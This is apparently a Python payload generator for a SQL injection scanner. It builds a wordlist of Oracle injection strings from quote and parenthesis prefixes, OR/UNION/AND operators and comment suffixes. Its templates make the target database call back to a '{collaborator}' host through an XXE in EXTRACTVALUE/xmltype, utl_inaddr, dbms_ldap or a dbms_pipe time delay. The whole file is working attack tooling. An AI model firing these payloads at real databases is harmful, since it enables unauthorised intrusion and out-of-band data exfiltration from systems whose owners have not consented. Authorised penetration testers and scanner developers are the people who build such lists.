prefixes = [
    '',
    '" ',
    '") ',
    '")) ',
    '"))) ',
    ') ',
    ')) ',
    '))) '
]

sqlOperators = [
    '',
    'OR ',
    'UNION ',
    'AND '
]

suffixes = [
    # '',
    '--'
    # ' ("',
    # ' (("',
    # ' ((("',
    # ' (',
    # ' ((',
    # ' ((('
]

templates = [
    'SELECT EXTRACTVALUE(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{collaborator}/"> %remote;]>\'),\'/l\') FROM dual',
    'SELECT utl_inaddr.get_host_address("{collaborator}")',
    'SELECT sys.dbms_ldap.init("{collaborator}",80) FROM DUAL',
    '123=dbms_pipe.receive_message(("a"),{time})'
]


concats = [
    ['"||', '||"'],
    ['"||(', ')||"'],
    ['||', ''],
    ['||(', ')']
]

def generate_quick():
    # injection via string concatination
    # - can concat int and str due to 'implicit' conversion
    # - TODO: test if you can do this even if this causes an error with ints
    wordlist = []
    for concat in concats:
        for template in templates:
            word = concat[0] + template + concat[1]
            wordlist.append(word)

            word = concat[0].replace('"', '\'') + template + concat[1].replace('"', '\'')
            wordlist.append(word)
    wordlist = list(set(wordlist))
    return wordlist


def generate():
    wordlist = []
    # injection via operators
    for prefix in prefixes:
        for sqlOperator in sqlOperators:
            for template in templates:
                for suffix in suffixes:
                    word = prefix + sqlOperator + template + suffix
                    wordlist.append(word)
                    word = prefix.replace('"', '\'') + sqlOperator + template + suffix.replace('"', '\'')
                    wordlist.append(word)
    
    wordlist = list(set(wordlist))
    wordlist = generate_quick() + wordlist
    return wordlist
